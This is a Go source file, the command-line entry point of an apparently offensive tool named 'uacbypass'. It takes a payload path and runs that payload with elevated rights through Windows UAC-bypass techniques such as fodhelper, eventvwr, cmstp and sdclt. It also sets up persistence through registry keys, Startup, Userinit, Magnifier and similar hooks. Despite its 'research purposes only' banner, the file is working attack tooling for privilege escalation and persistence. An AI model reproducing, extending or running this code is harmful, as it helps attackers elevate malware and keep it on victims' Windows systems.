// Copyright (c) 2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
	. "uacbypass/pkg"
	once "uacbypass/pkg/once"
	"uacbypass/pkg/persist"

	flags "github.com/jessevdk/go-flags"
	tablewriter "github.com/olekukonko/tablewriter"
)

var Options struct {
	Path      string `long:"path" description:"Path to payload"`
	Technique string `short:"t" long:"technique" description:"Executing technique of UAC bypassing"`
	Once      bool   `short:"o" long:"once" description:"Execute once elevation"`
	Persist   bool   `short:"p" long:"persist" description:"Execute persistent elevation"`
	Cleanup   bool   `short:"c" long:"cleanup" description:"Cleanup all files and registry keys used during elevation"`
	List      bool   `short:"l" long:"list" description:"Show list of all currently implemented techniques"`
}

func main() {
	print(`
     ██████╗ ██╗   ██╗ █████╗  ██████╗██████╗ ██████╗ 
    ██╔════╝ ██║   ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗
    ██║  ███╗██║   ██║███████║██║     ██████╔╝██████╔╝
    ██║   ██║██║   ██║██╔══██║██║     ██╔══██╗██╔═══╝ 
    ╚██████╔╝╚██████╔╝██║  ██║╚██████╗██████╔╝██║     
     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═════╝ ╚═╝     
      by 0x9ef, for researches purposes ONLY! 
      version 2.1.0
` + "\n")

	fmt.Printf("General information:\n")
	fmt.Printf("  UAC Level: %d\n", GetUACLevel())
	fmt.Printf("  Build number: %d\n", GetBuildNumber())
	fmt.Printf("  Status: OK\n\n")

	// parse flags
	if _, err := flags.NewParser(&Options, flags.HelpFlag|flags.PassDoubleDash).Parse(); err != nil {
		panic(err)
	}

	type onceKv struct {
		info Info
		f    OnceExecutor
	}

	type persistKv struct {
		info Info
		f    PersistExecutor
	}

	// Once implemented techniques list
	var tableOnce []onceKv
	tableOnce = append(tableOnce, onceKv{InfoOnceCmstp, once.ExecCmstp})
	tableOnce = append(tableOnce, onceKv{InfoOnceComputerdefaults, once.ExecComputerdefaults})
	tableOnce = append(tableOnce, onceKv{InfoOnceEventvwr, once.ExecEventvwr})
	tableOnce = append(tableOnce, onceKv{InfoOnceFodhelper, once.ExecFodhelper})
	tableOnce = append(tableOnce, onceKv{InfoOnceSdcltcontrol, once.ExecSdcltcontrol})
	tableOnce = append(tableOnce, onceKv{InfoOnceSilentcleanup, once.ExecSilentcleanup})
	tableOnce = append(tableOnce, onceKv{InfoOnceSlui, once.ExecSlui})
	tableOnce = append(tableOnce, onceKv{InfoOnceWsreset, once.ExecWsreset})

	// Persist implemented techniques list
	var tablePersist []persistKv
	tablePersist = append(tablePersist, persistKv{InfoPersistCortana, persist.ExecutorCortana{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistHkcu, persist.ExecutorHkcu{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistHklm, persist.ExecutorHklm{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistMagnifier, persist.ExecutorMagnifier{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistPeople, persist.ExecutorPeople{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistStartup, persist.ExecutorStartup{}})
	tablePersist = append(tablePersist, persistKv{InfoPersistUserinit, persist.ExecutorUserinit{}})

	if Options.List {
		draw := tablewriter.NewWriter(os.Stdout)
		draw.SetHeader([]string{"Id", "Type", "Name", "Description", "Fixed", "Admin"})
		draw.SetBorders(tablewriter.Border{Left: false, Top: false, Right: false, Bottom: false})
		draw.SetColWidth(48)
		fmt.Printf("Table information:\n")
		for i := range tableOnce {
			t := tableOnce[i]
			row := []string{fmt.Sprintf("%d", t.info.Id), "Once", t.info.Name, t.info.Description, "Unknown", "Unknown"}
			draw.Append(row)
		}
		for i := range tablePersist {
			t := tablePersist[i]
			row := []string{fmt.Sprintf("%d", t.info.Id), "Persist", t.info.Name, t.info.Description, "Unknown", "Unknown"}
			draw.Append(row)
		}
		draw.Render()
		fmt.Println()
	}

	flagPath := Options.Path
	absPath, err := filepath.Abs(flagPath)
	if err != nil {
		panic(err)
	}
	s, err := os.Stat(absPath) // check for path exists
	if err != nil {
		panic(err)
	} else {
		if s.IsDir() {
			panic("cannot setup folder as executable payload")
		}
	}

	flagTechnique := Options.Technique
	if len(flagTechnique) == 0 {
		flagTechnique = "fodhelper"
	}

	var ptype string
	ext := filepath.Ext(flagPath)
	switch ext {
	case ".exe":
		ptype = "Executable"
	case ".dll":
		ptype = "DLL"
	case ".png", ".jpg", ".jpeg", ".bmp", ".gif":
		ptype = "Image"
	default:
		ptype = "Undefined"
	}

	fmt.Printf("Selected [%s] %s payload\n", ptype, absPath)
	fmt.Printf("Selected 'win32/%s' bypass technique, trying to elevate...\n", flagTechnique)
	time.Sleep(2 * time.Second)
	log.Printf("Technique started!\n")
	var timeStart time.Time
	var timeEnd time.Time
	if Options.Once {
		var f OnceExecutor
		for i := range tableOnce {
			value := tableOnce[i]
			if strings.Contains(value.info.Name, flagTechnique) {
				f = value.f
				break
			}
		}
		timeStart = time.Now()
		err = f(absPath)
		if err != nil {
			log.Printf("ERR! Cannot elevate, because... %s\n", err.Error())
			return
		}
		timeEnd = time.Now()
	} else if Options.Persist {
		var f PersistExecutor
		for i := range tablePersist {
			value := tablePersist[i]
			if strings.Contains(value.info.Name, flagTechnique) {
				f = value.f
				break
			}
		}

		// Cleanup if setuped
		if Options.Cleanup {
			defer f.Revert()
		}
		timeStart = time.Now()
		err = f.Exec(absPath)
		if err != nil {
			log.Printf("ERR! Cannot elevate, because... %s\n", err.Error())
			return
		}
		timeEnd = time.Now()
	} else {
		panic("please select options of executable method once/persist by --once or --persist flags. Type --help for more information")
	}
	log.Printf("Succesfully completed.\n")
	fmt.Printf("Time tooked: %.2fsecs\n", timeEnd.Sub(timeStart).Seconds())
}
